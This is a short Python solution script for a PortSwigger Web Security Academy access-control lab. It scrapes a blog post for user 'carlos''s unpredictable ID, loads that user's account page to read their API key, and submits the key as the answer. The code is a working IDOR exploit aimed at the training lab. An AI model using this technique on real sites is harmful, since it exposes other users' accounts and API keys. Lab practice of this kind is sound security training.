"""
https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids
"""

import sys
import requests
from bs4 import BeautifulSoup
import re

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

resp = s.get(f'https://{site}/post?postId=9')
soup = BeautifulSoup(resp.text,'html.parser')
carlos_userid = soup.find('a',text='carlos')['href'].split('=')[1]

resp = s.get(f'https://{site}/my-account?id={carlos_userid}')
soup = BeautifulSoup(resp.text,'html.parser')
div_text = soup.find('div', text=re.compile('API')).text
api_key = div_text.split(' ')[4]

url = f'https://{site}/submitSolution'
resp = s.post(url,data={'answer':api_key})